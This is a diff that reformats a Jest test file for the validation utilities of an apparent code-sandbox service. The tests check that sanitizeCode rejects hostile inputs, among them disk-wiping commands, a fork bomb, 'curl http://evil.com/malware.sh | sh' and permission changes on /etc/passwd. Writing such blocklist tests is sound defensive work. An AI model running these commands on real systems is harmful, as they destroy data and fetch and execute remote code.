@@ -1,9 +1,4 @@
-import {
-    validateLanguage,
-    validateImage,
-    sanitizeCode,
-    validateJavaClass
-} from '../../utils/validation';
+import { validateLanguage, validateImage, sanitizeCode, validateJavaClass } from '../../utils/validation';
 
 describe('Validation Utilities', () => {
     beforeEach(() => {
@@ -17,7 +12,7 @@ describe('Validation Utilities', () => {
     describe('validateLanguage', () => {
         it('should accept valid lowercase languages', () => {
             const validLanguages = ['python', 'javascript', 'java', 'cpp', 'c', 'rust', 'go'];
-            validLanguages.forEach(lang => {
+            validLanguages.forEach((lang) => {
                 expect(validateLanguage(lang)).toBe(true);
             });
         });
@@ -30,7 +25,7 @@ describe('Validation Utilities', () => {
 
         it('should reject invalid languages', () => {
             const invalidLanguages = ['invalid', 'cobol', 'fortran', ''];
-            invalidLanguages.forEach(lang => {
+            invalidLanguages.forEach((lang) => {
                 expect(validateLanguage(lang)).toBe(false);
             });
         });
@@ -45,11 +40,25 @@ describe('Validation Utilities', () => {
 
         it('should support all 17 backend languages', () => {
             const allLanguages = [
-                'python', 'javascript', 'java', 'c', 'cpp', 'csharp',
-                'go', 'rust', 'php', 'r', 'ruby', 'kotlin',
-                'typescript', 'swift', 'perl', 'haskell', 'bash'
+                'python',
+                'javascript',
+                'java',
+                'c',
+                'cpp',
+                'csharp',
+                'go',
+                'rust',
+                'php',
+                'r',
+                'ruby',
+                'kotlin',
+                'typescript',
+                'swift',
+                'perl',
+                'haskell',
+                'bash'
             ];
-            allLanguages.forEach(lang => {
+            allLanguages.forEach((lang) => {
                 expect(validateLanguage(lang)).toBe(true);
             });
         });
@@ -70,7 +79,7 @@ describe('Validation Utilities', () => {
 
         it('should reject invalid images', () => {
             const invalidImages = ['invalid-image', 'malicious:latest', ''];
-            invalidImages.forEach(image => {
+            invalidImages.forEach((image) => {
                 expect(validateImage(image)).toBe(false);
             });
         });
@@ -117,7 +126,9 @@ describe('Validation Utilities', () => {
             it('should reject destructive file system commands', () => {
                 expect(() => sanitizeCode('rm -rf /')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                 expect(() => sanitizeCode('mkfs.ext4 /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
-                expect(() => sanitizeCode('dd if=/dev/zero of=/dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('dd if=/dev/zero of=/dev/sda')).toThrow(
+                    '코드에 위험한 패턴이 포함되어 있습니다.'
+                );
                 expect(() => sanitizeCode('wipefs -a /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                 expect(() => sanitizeCode('fdisk /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                 expect(() => sanitizeCode('del /f important.txt')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
@@ -132,7 +143,9 @@ describe('Validation Utilities', () => {
             });
 
             it('should reject system service commands', () => {
-                expect(() => sanitizeCode('systemctl stop firewalld')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('systemctl stop firewalld')).toThrow(
+                    '코드에 위험한 패턴이 포함되어 있습니다.'
+                );
                 expect(() => sanitizeCode('shutdown -h now')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                 expect(() => sanitizeCode('reboot')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
             });
@@ -144,7 +157,9 @@ describe('Validation Utilities', () => {
 
             it('should reject permission changes', () => {
                 expect(() => sanitizeCode('chmod 777 /etc/passwd')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
-                expect(() => sanitizeCode('chown root:root /etc/shadow')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('chown root:root /etc/shadow')).toThrow(
+                    '코드에 위험한 패턴이 포함되어 있습니다.'
+                );
             });
 
             it('should reject user/group manipulation', () => {
@@ -175,7 +190,9 @@ describe('Validation Utilities', () => {
 
             it('should reject shell injection patterns', () => {
                 expect(() => sanitizeCode('bash -i test')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
-                expect(() => sanitizeCode('curl http://evil.com/malware.sh | sh')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('curl http://evil.com/malware.sh | sh')).toThrow(
+                    '코드에 위험한 패턴이 포함되어 있습니다.'
+                );
                 expect(() => sanitizeCode(':(){ :|: & };:')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
             });
 
@@ -189,7 +206,9 @@ describe('Validation Utilities', () => {
             });
 
             it('should reject sys filesystem access', () => {
-                expect(() => sanitizeCode('cat /sys/class/net/eth0/address')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
+                expect(() => sanitizeCode('cat /sys/class/net/eth0/address')).toThrow(
+                    '코드에 위험한 패턴이 포함되어 있습니다.'
+                );
             });
         });
 
@@ -202,7 +221,7 @@ describe('Validation Utilities', () => {
                 'let result = numbers.map(x => x * 2);',
                 'const message = "This is safe code";'
             ];
-            safeCodes.forEach(code => {
+            safeCodes.forEach((code) => {
                 expect(() => sanitizeCode(code)).not.toThrow();
             });
         });
@@ -281,7 +300,7 @@ public class TestClass {
                 'public\tclass\tTabClass{}',
                 'public\nclass\nNewlineClass{}'
             ];
-            variations.forEach(code => {
+            variations.forEach((code) => {
                 expect(() => validateJavaClass(code)).not.toThrow();
             });
         });
